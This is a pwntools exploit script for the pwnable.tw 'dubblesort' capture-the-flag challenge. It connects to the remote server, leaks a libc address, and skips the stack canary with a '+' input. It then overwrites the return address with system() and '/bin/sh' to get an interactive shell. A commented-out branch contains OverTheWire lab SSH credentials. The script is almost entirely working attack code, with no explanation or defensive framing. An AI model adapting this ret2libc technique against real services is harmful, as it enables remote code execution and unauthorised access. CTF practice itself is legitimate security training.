from pwn import * # Import pwntools
import numpy as np
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './dubblesort_patched'
REMOTE_BIN = '~/libc.so.6' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw',10101) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')



##########################
##### OFFSET FINDER ######
##########################



#####################
#### Find Gadgets ###
#####################
try:
    libc_func = 'puts'
    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
except:
    libc_func = 'printf'
    PUTS_PLT = ELF_LOADED.plt['printf']

#MAIN_PLT = ELF_LOADED.symbols['main']
#POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
#RET = (ROP_LOADED.find_gadget(['ret']))[0]

#log.info('Main start: ' + hex(MAIN_PLT))
#log.info('Puts plt: ' + hex(PUTS_PLT))
#log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
#log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################

def get_addr(libc_func):
    FUNC_GOT = ELF_LOADED.got[libc_func]
    log.info(libc_func + ' GOT @ ' + hex(FUNC_GOT))
    # Create rop chain
    rop1 = b'A'*24
    # Send our rop-chain payload
    #P.sendlineafter('dah?', rop1) #Use this to send the payload when something is received
    print(P.clean()) # clean socket buffer (read all and print)
    P.sendline(rop1)
    P.recvline()
    received = P.recv(3)
    print(received)
    leak= u32(received.rjust(4,b'\x00'))
    print(hex(leak))
    if LIBC: 
        LIBC.address = leak - 0x1b0000 #Save LIBC base
        log.info('LIBC base @ %s' % hex(LIBC.address))
    # If not LIBC yet, stop here
    else:
        print('TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)')
        P.interactive()
    
    return hex(leak)

get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base

def send_padding(num):
    for i in range(0,num):
	    if (i==24):
	    	P.sendline(b'+')
	    	continue
	    if (i>24):
	    	P.sendline(str(np.uint32(0xf0000000)))
	    	continue
	    rop1 = b'1111'
	    print(P.clean()) # clean socket buffer (read all and print)
	    P.sendline(rop1)
	    
	 
	    

##############################
##### FINAL EXPLOITATION #####
##############################

BINSH = next(LIBC.search(b'/bin/sh')) 
SYSTEM = LIBC.sym['system']
EXIT = LIBC.sym['exit']

log.info('bin/sh %s ' % hex(BINSH))
log.info('system %s ' % hex(SYSTEM))
log.info('exit %s ' % hex(EXIT))

P.sendline(b'35')
send_padding(31)
print(P.clean()) # clean socket buffer (read all and print)
P.sendline(str(np.uint32(0xf0000000)))
print(P.clean()) # clean socket buffer (read all and print)
P.sendline(str(np.uint32(SYSTEM)))
print(P.clean()) # clean socket buffer (read all and print)
P.sendline(str(np.uint32(SYSTEM+0x100)))
print(P.clean()) # clean socket buffer (read all and print)
P.sendline(str(np.uint32(BINSH)))
P.interactive()
#P.interactive() #Interact with your shell :)
